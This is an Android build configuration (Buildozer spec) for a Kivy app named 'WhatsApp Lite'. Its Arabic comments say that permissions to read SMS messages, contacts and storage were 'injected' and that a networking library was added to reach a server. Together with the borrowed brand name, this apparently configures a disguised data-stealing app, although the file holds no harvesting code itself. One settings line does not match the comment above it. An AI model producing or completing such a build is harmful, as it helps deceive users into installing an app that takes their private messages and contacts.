[app]
# (string) Title of your application
title = WhatsApp Lite

# (string) Package name
package.name = whatsapplite

# (string) Package domain (needed for android packaging)
package.domain = org.test

# (string) Source code where the main.py lives
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (string) Application version
version = 0.1

# (list) Application requirements
# تم إضافة مكتبة requests هنا تلقائياً لضمان الاتصال بالسيرفر
requirements = python3,kivy,requests

# (list) Permissions
# هنا تم حقن الصلاحيات الصارمة (الرسائل، الأسماء، التخزين، الإنترنت)
android.permissions = READ_SMS, READ_CONTACTS, READ_EXTERNAL_STORAGE, INTERNET

# (int) Target Android API, should be as high as possible.
android.api = 31

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = r25b

# (int) Android NDK API to use
android.ndk_api = 21

# (bool) Use ccache to speed up reuse
user.html = 0

# (string) Orientation (landscape, portrait or all)
orientation = portrait

# (bool) Indicate if the application should be fullscreen or not
fullscreen = 1

[buildozer]
# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = False, 1 = True)
warn_on_root = 1
